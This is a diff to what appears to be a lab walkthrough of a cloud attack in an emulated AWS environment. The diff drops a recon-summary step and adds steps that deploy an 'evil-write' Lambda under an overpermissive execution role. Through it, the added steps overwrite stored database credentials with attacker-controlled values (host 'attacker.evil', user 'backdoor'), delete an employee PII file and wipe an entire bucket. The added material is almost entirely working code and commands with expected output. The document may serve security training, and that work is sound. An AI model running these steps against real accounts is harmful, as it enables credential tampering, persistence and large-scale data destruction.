@@ -176,30 +176,6 @@ cat /tmp/enum_lambda_policy.json
 # Confirms: attacker is explicitly permitted to invoke
 ```
 
-### Step 7 — Recon summary
-
-```bash
-# Shell 2
-cat > /tmp/attacker_recon_summary.txt << 'RECON'
-=== RECON SUMMARY ===
-
-Identity:            dev-contractor (low privilege IAM user)
-
-S3 direct access:    DENIED — namespace isolation (404/NoSuchBucket)
-SSM direct access:   DENIED — namespace isolation (ParameterNotFound)
-
-Lambda discovered:   data-processor
-Lambda exec role:    lambda-overpermissive-role
-Bucket from env:     company-secrets-vault
-Invoke policy:       AllowAttackerAccount present — CAN INVOKE
-
-Attack path:         Invoke Lambda → exec role reads S3/SSM → exfil
-RECON
-cat /tmp/attacker_recon_summary.txt
-```
-
----
-
 ## Phase 3 — Lambda Pivot Attack
 
 The attacker now knows the function name, the target bucket, and that
@@ -438,12 +414,155 @@ for p in d.get('parameters',[]):
 "
 ```
 
-### Step 5 — Clean up evil Lambda
+### Step 5 — Credential poisoning — overwrite db-creds with attacker-controlled values
+
+The exec role has `s3:*` — not just read. Deploy a write-capable handler and replace
+legitimate credentials with attacker content. This persists after the Lambda is deleted.
+
+```bash
+# Shell 3 — build and deploy evil write/delete handler
+mkdir -p /tmp/evil && cat > /tmp/evil/index.js << 'EOF'
+const { S3Client, PutObjectCommand, DeleteObjectCommand, ListObjectsV2Command } = require("@aws-sdk/client-s3");
+const ENDPOINT = process.env.AWS_ENDPOINT_URL;
+const BUCKET   = process.env.BUCKET;
+const s3 = new S3Client({ region: "us-east-1", endpoint: ENDPOINT, forcePathStyle: true });
+
+exports.handler = async (event) => {
+  const action = event.action;
+  if (action === "write") {
+    await s3.send(new PutObjectCommand({ Bucket: BUCKET, Key: event.key, Body: event.content }));
+    return { result: `overwritten: ${event.key}` };
+  }
+  if (action === "delete") {
+    await s3.send(new DeleteObjectCommand({ Bucket: BUCKET, Key: event.key }));
+    return { result: `deleted: ${event.key}` };
+  }
+  if (action === "wipe") {
+    const list = await s3.send(new ListObjectsV2Command({ Bucket: BUCKET }));
+    const keys = (list.Contents || []).map(o => o.Key);
+    for (const k of keys) await s3.send(new DeleteObjectCommand({ Bucket: BUCKET, Key: k }));
+    return { result: `wiped ${keys.length} objects`, keys };
+  }
+};
+EOF
+cd /tmp/evil && zip evil.zip index.js
+
+aws lambda create-function \
+  --profile attacker \
+  --function-name evil-write \
+  --runtime nodejs18.x \
+  --role "$EXEC_ROLE" \
+  --handler index.handler \
+  --zip-file fileb:///tmp/evil/evil.zip \
+  --environment "Variables={BUCKET=company-secrets-vault,AWS_ENDPOINT_URL=http://${FLOCI_IP}:4566,AWS_ACCESS_KEY_ID=111111111111,AWS_SECRET_ACCESS_KEY=test}" \
+  --timeout 30 \
+  --output json | tee /tmp/attacker_evil_write_create.json
+
+aws lambda wait function-active \
+  --profile attacker \
+  --function-name evil-write 2>/dev/null || sleep 10
+```
+
+```bash
+# Shell 3 — overwrite db-creds with attacker-controlled content
+aws lambda invoke \
+  --profile attacker \
+  --function-name evil-write \
+  --payload '{"action":"write","key":"credentials/db-creds.txt","content":"DB_HOST=attacker.evil\nDB_USER=backdoor\nDB_PASSWORD=attacker_controlled\n"}' \
+  --cli-binary-format raw-in-base64-out \
+  /tmp/evil_poison_result.json
+
+cat /tmp/evil_poison_result.json | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+print(d.get('result',''))
+" | tee /tmp/evil_poison_summary.txt
+cat /tmp/evil_poison_summary.txt
+# Expected: overwritten: credentials/db-creds.txt
+```
+
+```bash
+# Shell 1 — confirm poisoned value is now live in the bucket
+echo "=== db-creds.txt as seen by legitimate account ==="
+aws s3 cp s3://company-secrets-vault/credentials/db-creds.txt - | tee /tmp/confirm_poison.txt
+# Expected: attacker-controlled values — not the original DB_PASSWORD=SuperSecret123!
+```
+
+### Step 6 — Data destruction — delete individual objects
+
+```bash
+# Shell 3 — delete the PII file
+aws lambda invoke \
+  --profile attacker \
+  --function-name evil-write \
+  --payload '{"action":"delete","key":"pii/employees.csv"}' \
+  --cli-binary-format raw-in-base64-out \
+  /tmp/evil_delete_result.json
+
+cat /tmp/evil_delete_result.json | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+print(d.get('result',''))
+" | tee /tmp/evil_delete_summary.txt
+cat /tmp/evil_delete_summary.txt
+# Expected: deleted: pii/employees.csv
+```
+
+```bash
+# Shell 1 — confirm file is gone
+echo "=== Vault contents after delete ==="
+aws s3api list-objects-v2 \
+  --bucket company-secrets-vault \
+  --query 'Contents[].Key' \
+  --output text | tee /tmp/confirm_delete.txt
+# Expected: pii/employees.csv absent from listing
+```
+
+### Step 7 — Wipe entire bucket — data destruction at scale
+
+```bash
+# Shell 3 — delete every object in the vault
+aws lambda invoke \
+  --profile attacker \
+  --function-name evil-write \
+  --payload '{"action":"wipe"}' \
+  --cli-binary-format raw-in-base64-out \
+  /tmp/evil_wipe_result.json
+
+cat /tmp/evil_wipe_result.json | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+print(d.get('result',''))
+print('Objects destroyed:')
+for k in d.get('keys',[]): print(f'  {k}')
+" | tee /tmp/evil_wipe_summary.txt
+cat /tmp/evil_wipe_summary.txt
+# Expected: wiped N objects — lists every key deleted
+```
+
+```bash
+# Shell 1 — confirm bucket is empty
+echo "=== Bucket contents after wipe ==="
+aws s3api list-objects-v2 \
+  --bucket company-secrets-vault \
+  --output json | tee /tmp/confirm_wipe.json
+python3 -c "
+import json
+d=json.load(open('/tmp/confirm_wipe.json'))
+count=len(d.get('Contents') or [])
+print(f'Objects remaining: {count}')
+print('Bucket is EMPTY' if count == 0 else 'WARNING: objects still present')
+"
+# Expected: Objects remaining: 0
+```
+
+### Step 8 — Clean up evil Lambdas
 
 ```bash
 # Shell 3
-aws lambda delete-function --function-name evil-exfil
-echo "Evil Lambda deleted"
+aws lambda delete-function --profile attacker --function-name evil-exfil 2>/dev/null
+aws lambda delete-function --profile attacker --function-name evil-write
+echo "Evil Lambdas deleted"
 ```
 
 ---
